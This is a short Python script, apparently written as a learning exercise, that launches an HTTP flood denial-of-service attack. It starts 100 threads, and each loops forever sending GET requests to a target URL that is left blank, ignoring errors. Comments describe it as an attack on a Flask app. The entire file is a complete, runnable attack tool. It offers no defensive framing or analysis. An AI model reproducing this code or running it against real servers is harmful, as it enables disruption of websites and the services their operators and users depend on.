import requests
import threading
# By using threading we can run multiple attack requests at the same time, and requests allows me to attack a web server (essentially)


# This attack is directly to a flask app
target_url = ""

# this creates an infinite loop, constantly sending GET requests, ignoring all the errrors 
def http_flood():
    while True:
        try:
            requests.get(target_url)
            print(f"Sent request to {target_url}")
        except requests.exceptions.RequestException:
            pass

# Creating 100 attacks running at the same time, sending coninuous requests
for _ in range(100):
    thread = threading.Thread(target=http_flood)
    thread.start()